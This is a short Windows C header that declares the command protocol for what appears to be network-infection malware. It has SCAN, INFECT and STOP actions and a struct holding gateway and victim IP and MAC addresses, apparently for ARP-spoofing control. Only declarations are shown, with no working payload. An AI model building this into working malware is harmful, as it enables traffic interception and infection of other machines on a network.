#pragma once
#pragma pack(1)

#include <Windows.h>

enum ACTS
{
	SCAN, //start scanning the net
	INFECT, //start infecting
	STOP_I, //stop infecting
	STOP_S, //stop scanning
	STOP_A //stop all
};

typedef struct command
{
	BYTE act;
	ULONG gateway_ip;
	ULONG victim_ip;
	BYTE gateway_mac[6];
	BYTE victim_mac[6];
	//etc...
} *pCommand;

void execute_command(pCommand command);